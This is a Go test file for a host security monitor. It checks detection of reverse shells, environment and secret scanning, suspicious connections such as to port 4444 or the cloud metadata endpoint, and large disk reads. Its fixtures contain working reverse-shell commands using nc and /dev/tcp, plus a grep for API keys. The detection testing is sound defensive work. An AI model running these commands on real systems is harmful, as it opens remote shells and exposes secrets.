package monitor

import (
	"strings"
	"testing"
)

func TestDetectReverseShells(t *testing.T) {
	tests := []struct {
		name      string
		processes []Process
		wantCount int
	}{
		{
			name: "detect nc -e reverse shell",
			processes: []Process{
				{PID: 1234, User: "root", Command: "nc -e /bin/bash 192.168.1.100 4444"},
				{PID: 1235, User: "root", Command: "bash"},
			},
			wantCount: 1,
		},
		{
			name: "detect bash tcp redirect",
			processes: []Process{
				{PID: 1234, User: "root", Command: "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"},
			},
			wantCount: 1,
		},
		{
			name: "normal processes",
			processes: []Process{
				{PID: 1234, User: "root", Command: "bash"},
				{PID: 1235, User: "root", Command: "ps aux"},
			},
			wantCount: 0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			threats := DetectReverseShells(tt.processes)
			if len(threats) != tt.wantCount {
				t.Errorf("DetectReverseShells() got %d threats, want %d", len(threats), tt.wantCount)
			}
		})
	}
}

func TestDetectEnvScanning(t *testing.T) {
	tests := []struct {
		name      string
		processes []Process
		wantCount int
	}{
		{
			name: "detect env command",
			processes: []Process{
				{PID: 1234, User: "root", Command: "env", EnvAccess: true},
			},
			wantCount: 1,
		},
		{
			name: "detect grep for secrets",
			processes: []Process{
				{PID: 1234, User: "root", Command: "grep -r API_KEY", EnvAccess: true},
			},
			wantCount: 1,
		},
		{
			name: "normal processes",
			processes: []Process{
				{PID: 1234, User: "root", Command: "bash", EnvAccess: false},
			},
			wantCount: 0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			threats := DetectEnvScanning(tt.processes)
			if len(threats) != tt.wantCount {
				t.Errorf("DetectEnvScanning() got %d threats, want %d", len(threats), tt.wantCount)
			}
		})
	}
}

func TestCheckSuspicious(t *testing.T) {
	tests := []struct {
		name         string
		conn         Connection
		allowedCIDRs []string
		wantReason   string
	}{
		{
			name: "RFC1918 private address",
			conn: Connection{
				LocalAddr:  "10.47.62.50:12345",
				RemoteAddr: "192.168.1.100:4444",
				State:      "ESTABLISHED",
			},
			allowedCIDRs: []string{},
			wantReason:   "RFC1918 private address",
		},
		{
			name: "suspicious port on public IP",
			conn: Connection{
				LocalAddr:  "10.47.62.50:12345",
				RemoteAddr: "203.0.113.1:4444",
				State:      "ESTABLISHED",
			},
			allowedCIDRs: []string{},
			wantReason:   "Suspicious port: 4444",
		},
		{
			name: "metadata endpoint",
			conn: Connection{
				LocalAddr:  "10.47.62.50:12345",
				RemoteAddr: "169.254.169.254:80",
				State:      "ESTABLISHED",
			},
			allowedCIDRs: []string{},
			wantReason:   "Cloud metadata endpoint access",
		},
		{
			name: "normal connection",
			conn: Connection{
				LocalAddr:  "10.47.62.50:12345",
				RemoteAddr: "52.84.142.12:443",
				State:      "ESTABLISHED",
			},
			allowedCIDRs: []string{},
			wantReason:   "",
		},
		{
			name: "listen socket",
			conn: Connection{
				LocalAddr:  "0.0.0.0:22",
				RemoteAddr: "0.0.0.0:0",
				State:      "LISTEN",
			},
			allowedCIDRs: []string{},
			wantReason:   "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			reason := checkSuspicious(tt.conn, tt.allowedCIDRs)
			if (reason != "") != (tt.wantReason != "") {
				t.Errorf("checkSuspicious() reason = %q, want %q", reason, tt.wantReason)
			}
			if tt.wantReason != "" && !strings.Contains(reason, tt.wantReason) {
				t.Errorf("checkSuspicious() reason = %q, want to contain %q", reason, tt.wantReason)
			}
		})
	}
}

func TestDetectLargeReads(t *testing.T) {
	tests := []struct {
		name       string
		stats      FilesystemStats
		threshold  float64
		wantThreat bool
	}{
		{
			name: "large read exceeds threshold",
			stats: FilesystemStats{
				Available:        true,
				TotalReadMB:      100.0,
				ReadRateMBPerSec: 50.0,
			},
			threshold:  50.0,
			wantThreat: true,
		},
		{
			name: "normal read below threshold",
			stats: FilesystemStats{
				Available:        true,
				TotalReadMB:      10.0,
				ReadRateMBPerSec: 5.0,
			},
			threshold:  50.0,
			wantThreat: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			threat := DetectLargeReads(tt.stats, tt.threshold, 0)
			if (threat != nil) != tt.wantThreat {
				t.Errorf("DetectLargeReads() threat = %v, want threat = %v", threat != nil, tt.wantThreat)
			}
		})
	}
}
